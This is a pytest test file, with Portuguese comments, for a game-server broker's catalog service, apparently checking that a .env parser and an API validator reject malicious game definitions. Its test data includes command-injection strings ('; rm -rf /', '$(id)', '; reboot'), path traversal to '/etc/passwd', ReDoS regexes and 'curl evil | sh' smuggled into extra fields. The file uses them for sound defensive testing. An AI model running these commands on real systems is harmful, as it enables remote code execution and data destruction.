"""Catalogo: leitura do .env sem shell e validacao dos jogos cadastrados pela API."""
from __future__ import annotations

import json
from pathlib import Path

import pytest

import gamebroker.services.catalog as cat
from gamebroker.domain.exceptions import Conflict, NotFound, ValidationError

RAIZ = Path(__file__).resolve().parent.parent.parent


# --- parser do .env -------------------------------------------------------

def test_env_le_valores_simples_e_ignora_comentarios():
    data = cat.read_env('# cabecalho\nA=1\nB="dois palavras"  # nota\nC=tres # nota\n\nD=\n')
    assert data == {"A": "1", "B": "dois palavras", "C": "tres", "D": ""}


def test_env_nao_expande_nada():
    data = cat.read_env('X="-a $(id) `whoami` $HOME"\n')
    assert data["X"] == "-a $(id) `whoami` $HOME"


def test_env_aspas_simples_multilinha_e_apostrofo_escapado():
    texto = "PRE='\necho \"oi\"\necho it'\\''s ok\n'\nDEPOIS=1\n"
    data = cat.read_env(texto)
    assert "echo it's ok" in data["PRE"]
    assert data["DEPOIS"] == "1", "a linha depois do bloco multilinha continua sendo lida"


def test_env_aspas_duplas_com_escape():
    assert cat.read_env(r'A="uma \"citacao\" e \$var"')["A"] == 'uma "citacao" e $var'


def test_env_aspas_sem_fechar_e_erro():
    with pytest.raises(ValueError, match="aspas sem fechar"):
        cat.read_env("A='abc\nB=1\n")


# --- catalogo curado (arquivos reais do repositorio) -----------------------

def test_todos_os_env_do_repo_sao_lidos_sem_erro():
    jogos, errors = cat.load_curated(RAIZ / "games")
    assert errors == []
    assert "palworld" in jogos


def test_palworld_e_criavel_e_dayz_e_teamspeak_nao():
    jogos, _ = cat.load_curated(RAIZ / "games")
    assert jogos["palworld"].creatable
    assert cat.Port(8211, "udp") in jogos["palworld"].ports
    assert not jogos["dayz"].creatable
    assert "conta Steam" in jogos["dayz"].reason
    assert not jogos["teamspeak"].creatable
    assert "instalador proprio" in jogos["teamspeak"].reason


def test_hooks_do_curado_nunca_aparecem_na_api():
    jogos, _ = cat.load_curated(RAIZ / "games")
    palworld = jogos["palworld"]
    assert palworld.has_hooks
    as_public = json.dumps(palworld.as_public())
    assert "steamclient" not in as_public
    assert "install" not in as_public.lower()


def test_arquivo_ruim_vira_erro_e_nao_derruba_o_resto(tmp_path):
    (tmp_path / "bom.env").write_text("GAME_KEY=bom\nSTEAM_APP_ID=1\nGAME_PORTS=7000/udp\n")
    (tmp_path / "ruim.env").write_text("GAME_KEY=Ruim_Chave\n")
    jogos, errors = cat.load_curated(tmp_path)
    assert list(jogos) == ["bom"]
    assert len(errors) == 1
    assert "ruim.env" in errors[0]


# --- validacao do jogo dinamico --------------------------------------------

def test_jogo_dinamico_valido(dados_de_jogo):
    game = cat.validate_dynamic(dados_de_jogo)
    assert game.creatable
    assert game.source == cat.SOURCE_DYNAMIC
    assert not game.has_hooks
    assert game.ports == (cat.Port(7777, "udp"), cat.Port(27016, "udp"))


def test_ida_e_volta_pelo_formato_gravado(dados_de_jogo):
    game = cat.validate_dynamic(dados_de_jogo)
    assert cat.validate_dynamic(game.as_stored()) == game


CASOS_INVALIDOS = [
    # comando de shell escondido em argumento
    ("start_args", "-x; rm -rf /"), ("start_args", "$(id)"), ("start_args", "`id`"),
    ("start_args", "a | b"), ("start_args", "a && b"), ("start_args", "-p {OUTRO}"),
    ("start_args", "a\nb"), ("start_args", "x" * 301),
    # caminhos
    ("start_script", "../../bin/sh"), ("start_script", "/bin/sh"), ("start_script", "a b"),
    ("config_path", "/etc"), ("config_path", "/opt/game/../../etc"),
    ("config_files", ["/etc/passwd"]), ("config_files", "nao-e-lista"),
    ("backup_paths", ["/opt/game/.."]), ("log_path", "/var/log/x"),
    # identidade
    ("chave", "Bad_Key"), ("chave", "a"), ("chave", "x" * 30), ("chave", "a;b"),
    ("nome", "x;y"), ("nome", ""), ("nome", "n" * 41),
    # numeros
    ("app_id", "123"), ("app_id", True), ("app_id", 0), ("app_id", 2**31),
    ("memoria_mb", 10**9), ("cores", True), ("disco_gb", 1),
    # portas
    ("portas", []), ("portas", ["80/tcp"]), ("portas", ["1023/udp"]), ("portas", ["8080/tcp"]),
    ("portas", ["8006/tcp"]), ("portas", ["25575/tcp"]), ("portas", ["99999/udp"]),
    ("portas", ["7777/udp", "7777/udp"]), ("portas", ["7777"]), ("portas", ["7777/icmp"]),
    ("porta_jogo", 9999), ("porta_query", 1234),
    # enums
    ("plataforma", "freebsd"), ("player_source", "http"), ("receitas", ["rm -rf /"]),
    ("deslocavel", "sim"),
    # regex do log
    ("join_re", "(a+)+$"), ("join_re", "(.*)*x"), ("join_re", "(a|b*)+"), ("join_re", "x" * 201),
    ("join_re", "("),
]


@pytest.mark.parametrize(("campo", "valor"), CASOS_INVALIDOS, ids=lambda v: repr(v)[:30])
def test_campo_invalido_e_recusado(dados_de_jogo, campo, valor):
    dados_de_jogo[campo] = valor
    with pytest.raises(ValidationError) as error:
        cat.validate_dynamic(dados_de_jogo)
    assert campo in str(error.value)


@pytest.mark.parametrize(("mudancas", "trecho"), [
    ({"portas": ["7777/udp", "27016/udp", "2303/udp", "2304/udp"]}, "mais portas"),
    ({"start_args": "-log"}, "{PORT}"),
    ({"start_args": "-port={PORT}"}, "{QUERY_PORT}"),
])
def test_deslocavel_exige_que_o_jogo_receba_todas_as_portas(dados_de_jogo, mudancas, trecho):
    """Sem isso o firewall abriria uma porta que o jogo nao escuta (ou uma que ele ignora)."""
    dados_de_jogo.update(mudancas)
    with pytest.raises(ValidationError, match="deslocavel") as error:
        cat.validate_dynamic(dados_de_jogo)
    assert trecho in str(error.value)


def test_jogo_fixo_pode_ter_portas_extras_e_nenhum_marcador(dados_de_jogo):
    dados_de_jogo.update(portas=["7777/udp", "27016/udp", "2303/udp"], start_args="-log", deslocavel=False)
    assert cat.validate_dynamic(dados_de_jogo).shiftable is False


def test_jogo_curado_deslocavel_sem_marcador_vira_erro_do_catalogo(tmp_path):
    (tmp_path / "ruim.env").write_text(
        'GAME_KEY=ruim\nSTEAM_APP_ID=1\nGAME_PORT=7001\nGAME_PORTS="7001/udp"\nPORTS_SHIFTABLE=1\n', encoding="utf-8")
    jogos, errors = cat.load_curated(tmp_path)
    assert jogos == {}
    assert "PORTS_SHIFTABLE" in errors[0]
    assert "{PORT}" in errors[0]


@pytest.mark.parametrize("campo", ["pre_install_cmd", "post_install_cmd", "provision_script", "PRE_INSTALL_CMD", "x"])
def test_campo_desconhecido_e_recusado_para_nao_entrar_comando_de_contrabando(dados_de_jogo, campo):
    dados_de_jogo[campo] = "curl evil | sh"
    with pytest.raises(ValidationError, match="desconhecido"):
        cat.validate_dynamic(dados_de_jogo)


@pytest.mark.parametrize("corpo", [None, [], "texto", 7])
def test_corpo_que_nao_e_objeto_e_recusado(corpo):
    with pytest.raises(ValidationError, match="objeto JSON"):
        cat.validate_dynamic(corpo)


@pytest.mark.parametrize("campo", ["chave", "nome", "app_id", "portas", "porta_jogo"])
def test_campo_obrigatorio_ausente(dados_de_jogo, campo):
    del dados_de_jogo[campo]
    with pytest.raises(ValidationError, match="obrigatorio"):
        cat.validate_dynamic(dados_de_jogo)


def test_jogo_de_windows_exige_receita_de_windows(dados_de_jogo):
    dados_de_jogo["plataforma"] = "windows"
    dados_de_jogo["receitas"] = []
    with pytest.raises(ValidationError, match="wine"):
        cat.validate_dynamic(dados_de_jogo)
    dados_de_jogo["receitas"] = ["wine"]
    assert cat.validate_dynamic(dados_de_jogo).recipes == ("wine",)


def test_so_o_minimo_basta(dados_de_jogo):
    minimo = {k: dados_de_jogo[k] for k in ("chave", "nome", "app_id", "portas", "porta_jogo")}
    game = cat.validate_dynamic(minimo)
    assert (game.memory_mb, game.cores, game.disk_gb) == (4096, 2, 20)
    assert game.player_source == "log"


# --- Catalogo (curado + dinamico) -------------------------------------------

def test_catalogo_lista_curados_menos_o_template(catalog):
    assert [j.key for j in catalog.list_all()] == ["alfa", "beta", "conta", "delta"]


def test_adicionar_persiste_e_sobrevive_a_recarga(catalog, dados_de_jogo, tmp_path):
    catalog.add_dynamic(dados_de_jogo)
    outro = cat.Catalog(tmp_path / "games", tmp_path / "dinamico")
    assert outro.get("meujogo").name == "Meu Jogo"
    assert outro.errors == []


def test_adicionar_chave_de_jogo_curado_e_conflito(catalog, dados_de_jogo):
    dados_de_jogo["chave"] = "alfa"
    with pytest.raises(Conflict):
        catalog.add_dynamic(dados_de_jogo)


def test_adicionar_duas_vezes_e_conflito(catalog, dados_de_jogo):
    catalog.add_dynamic(dados_de_jogo)
    with pytest.raises(Conflict):
        catalog.add_dynamic(dados_de_jogo)


def test_jogo_recusado_nao_deixa_arquivo(catalog, dados_de_jogo, tmp_path):
    dados_de_jogo["start_args"] = "; reboot"
    with pytest.raises(ValidationError):
        catalog.add_dynamic(dados_de_jogo)
    assert list((tmp_path / "dinamico").glob("*")) == []


def test_arquivo_adulterado_em_disco_nao_vira_jogo(catalog, dados_de_jogo, tmp_path):
    catalog.add_dynamic(dados_de_jogo)
    arquivo = tmp_path / "dinamico" / "meujogo.json"
    adulterado = json.loads(arquivo.read_text())
    adulterado["pre_install_cmd"] = "curl evil | sh"
    arquivo.write_text(json.dumps(adulterado))
    outro = cat.Catalog(tmp_path / "games", tmp_path / "dinamico")
    with pytest.raises(NotFound):
        outro.get("meujogo")
    assert any("meujogo.json" in e for e in outro.errors)


def test_arquivo_com_nome_diferente_da_chave_e_ignorado(catalog, dados_de_jogo, tmp_path):
    catalog.add_dynamic(dados_de_jogo)
    (tmp_path / "dinamico" / "meujogo.json").rename(tmp_path / "dinamico" / "outro.json")
    outro = cat.Catalog(tmp_path / "games", tmp_path / "dinamico")
    with pytest.raises(NotFound):
        outro.get("meujogo")


def test_jogo_desconhecido(catalog):
    with pytest.raises(NotFound):
        catalog.get("nao-existe")
